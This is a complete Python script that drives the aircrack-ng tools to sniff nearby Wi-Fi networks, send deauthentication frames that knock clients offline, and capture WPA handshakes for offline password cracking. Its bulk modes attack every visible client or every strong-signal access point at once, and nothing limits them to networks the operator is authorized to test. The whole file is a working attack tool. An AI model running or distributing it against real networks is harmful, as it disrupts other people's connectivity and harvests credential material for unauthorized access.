#!/usr/bin/env python3
import os, re, subprocess, time, threading, csv, argparse
from datetime import datetime
from colorama import Fore, Style, init
from resources.mac_vendors import MAC_VENDOR_PREFIXES

init(autoreset=True)

LOG_FILE = "wifi_ap.log"
HANDSHAKE_DIR = "handshakes"
REFRESH = 6
MON_IF = None

for d in (HANDSHAKE_DIR,):
    os.makedirs(d, exist_ok=True)

def run_cmd(cmd, sudo=False):
    if sudo and os.geteuid() != 0:
        cmd = ['sudo'] + cmd
    return subprocess.check_output(cmd, encoding='utf-8', errors='ignore')

def select_interface():
    out = run_cmd(['iw', 'dev'])
    matches = re.findall(r'Interface\s+(\w+)', out)
    if not matches:
        print(Fore.RED + "[!] No wireless interfaces detected."); exit(1)
    print("Available interfaces:")
    for i, name in enumerate(matches, 1):
        print(f"  [{i}] {name}")
    choice = int(input("Choose interface: ")) - 1
    return matches[choice]

def enable_monitor():
    global MON_IF
    iface = select_interface()
    run_cmd(['iw', 'dev', iface, 'interface', 'add', iface + 'mon', 'type', 'monitor'], sudo=True)
    MON_IF = iface + 'mon'

def disable_monitor():
    if MON_IF:
        run_cmd(['iw', 'dev', MON_IF, 'del'], sudo=True)

def start_airodump():
    return subprocess.Popen(['sudo','airodump-ng','--write-interval','1',
                             '--write','/tmp/apdump','--output-format','csv', MON_IF],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def parse_csv():
    try:
        lines = open('/tmp/apdump-01.csv', errors='ignore').read().splitlines()
    except:
        return {}

    aps, clients = {}, []
    section = 0
    for line in lines:
        if not line.strip():
            continue
        if 'BSSID' in line and 'Privacy' in line:
            section = 1
            continue
        elif 'Station MAC' in line:
            section = 2
            continue

        if section == 1:
            parts = [x.strip() for x in line.split(',')]
            if len(parts) < 14:
                continue
            bssid = parts[0]
            try:
                ch = int(parts[3])
                sig = int(parts[8])
            except ValueError:
                continue
            ssid = parts[13].strip()
            aps[bssid] = {'ssid': ssid, 'ch': ch, 'sig': sig, 'clients': [], 'handshake': False}
        elif section == 2:
            parts = [x.strip() for x in line.split(',')]
            if len(parts) >= 6:
                client_mac = parts[0]
                ap_mac = parts[5]
                clients.append({'mac': client_mac, 'ap': ap_mac})

    for c in clients:
        if c['ap'] in aps:
            aps[c['ap']]['clients'].append(c['mac'])

    return aps


def vendor(mac):
    p = mac.lower().replace('-',':')[:8]
    return MAC_VENDOR_PREFIXES.get(p, "Unknown")

def log_event(evt, bssid='', ssid='', mac='', vendor_name='', sig=0):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, 'a+', encoding='utf-8') as f:
        f.write(f"{ts};{evt};{bssid};{ssid};{mac};{vendor_name};{sig}\n")

def deauth_and_capture(bssid, ssid, target_mac, channel):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe = re.sub(r'\W+', '_', ssid or bssid)
    base = os.path.join(HANDSHAKE_DIR, f"{safe}_{timestamp}")
    cap = base + "-01.cap"
    run = subprocess.Popen([
        'airodump-ng', '--bssid', bssid, '-c', str(channel), '-w', base, MON_IF
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    subprocess.Popen(['aireplay-ng','--deauth','5','-a',bssid, *(['-c',target_mac] if target_mac else []), MON_IF])
    time.sleep(10); run.terminate()
    print(Fore.CYAN + f"[*] verifying {cap} ...", end=' ')
    res = subprocess.run(['aircrack-ng','-a2','-w','/dev/null',cap], stdout=subprocess.PIPE, text=True)
    ok = 'handshake' in res.stdout.lower()
    print((Fore.GREEN + "[OK]") if ok else (Fore.RED + "[NO]"))
    log_event('HANDSHAKE_' + ('SUCCESS' if ok else 'FAIL'), bssid, ssid, target_mac, vendor(target_mac), 0)
    return ok

def display(aps):
    os.system('clear')
    now = datetime.now().strftime("%H:%M:%S")
    print(Fore.CYAN + f"[ WIFI MONITOR {now} ]" + Style.RESET_ALL)
    print(f"{'SSID':<20}{'BSSID':<20}{'SIG':<5}{'CLIENTS':<8} FLAG")
    print('-'*60)
    for b,info in aps.items():
        flag = Fore.GREEN + "[OK]" if info.get('handshake') else "    "
        print(f"{info['ssid'][:20]:<20}{b:<20}{info['sig']:<5}{len(info['clients']):<8}{flag}")
        for m in info['clients']:
            print("  " + m + " (" + vendor(m) + ")")
    print("\n[h] deauth+handshake selected   [H] for strong APs   [q] quit")

def input_listener(state):
    while state['running']:
        k = input().strip().lower()
        if k == 'q': state['running'] = False
        if k == 'h': state['do_h'] = True
        if k == 'h' and state['do_h']: state['do_H'] = True

def main():
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE,'w').write("ts;evt;bssid;ssid;mac;vendor;signal\n")
    enable_monitor()
    proc = start_airodump()
    state = {'running': True, 'do_h': False, 'do_H': False}

    threading.Thread(target=input_listener, args=(state,), daemon=True).start()

    try:
        while state['running']:
            aps = parse_csv()
            display(aps)

            if state['do_h']:
                for b,i in aps.items():
                    for m in i['clients']:
                        if deauth_and_capture(b, i['ssid'], m, i['ch']):
                            aps[b]['handshake'] = True
                state['do_h'] = False

            if state['do_H']:
                for b,i in aps.items():
                    if i['sig'] >= 40:
                        if deauth_and_capture(b, i['ssid'], '', i['ch']):
                            aps[b]['handshake'] = True
                state['do_H'] = False

            time.sleep(REFRESH)

    except KeyboardInterrupt:
        pass
    finally:
        proc.terminate()
        disable_monitor()

if __name__ == "__main__":
    main()
